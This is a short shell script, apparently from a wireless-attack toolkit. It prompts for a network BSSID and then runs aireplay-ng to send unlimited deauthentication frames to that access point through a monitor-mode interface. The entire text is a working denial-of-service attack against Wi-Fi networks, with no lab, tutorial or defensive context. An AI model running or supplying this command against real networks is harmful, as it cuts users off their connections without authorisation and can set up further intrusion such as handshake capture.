echo "Network BSSID: " && read net_bssid

clear && sudo aireplay-ng -0 0 -a $net_bssid wlan0mon
